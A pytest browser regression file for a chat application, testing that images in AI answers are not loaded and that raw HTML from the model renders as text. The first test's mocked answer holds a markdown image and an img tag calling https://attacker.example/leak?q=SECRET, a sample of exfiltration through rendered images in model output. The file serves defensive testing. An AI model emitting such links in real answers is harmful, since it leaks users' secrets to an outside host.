"""Round 3 browser regressions (VERIFY-1 findings B-40 and mutation M11)."""
from unittest import mock

import pytest

pytestmark = pytest.mark.e2e


def test_b40_external_images_in_ai_answers_are_not_loaded(logged_page, live_server):
    p = logged_page
    requested = []
    p.on("request", lambda req: requested.append(req.url) if "attacker.example" in req.url else None)
    p.route("**/attacker.example/**", lambda route: route.fulfill(status=200, body=""))
    answer = "Секрет:\n\n![t](https://attacker.example/leak?q=SECRET)\n\n<img src='https://attacker.example/x.png'>"
    with mock.patch("core.rag_engine.ask_second_brain", return_value=answer):
        p.goto(f"{live_server.url}/chat/")
        p.fill("#chat-input", "x")
        p.keyboard.press("Enter")
        body = p.locator(".chat-bubble .markdown-body").last
        body.locator(".blocked-image").wait_for()
        p.wait_for_timeout(500)
    assert requested == []
    assert body.locator("img").count() == 0
    link = body.locator(".blocked-image a")
    assert link.get_attribute("href").startswith("https://attacker.example/") and link.get_attribute("target") == "_blank"


def test_m11_raw_html_from_the_model_is_shown_as_text(logged_page, live_server):
    """D20: Markdown renders, raw HTML stays visible text (not markup)."""
    p = logged_page
    with mock.patch("core.rag_engine.ask_second_brain", return_value="<b>raw</b> and **md** <i>x</i>"):
        p.goto(f"{live_server.url}/chat/")
        p.fill("#chat-input", "x")
        p.keyboard.press("Enter")
        body = p.locator(".chat-bubble .markdown-body").last
        body.locator("strong").wait_for()
    assert body.locator("strong").inner_text() == "md"
    assert body.locator("b, i").count() == 0
    assert "<b>raw</b>" in body.inner_text() and "<i>x</i>" in body.inner_text()
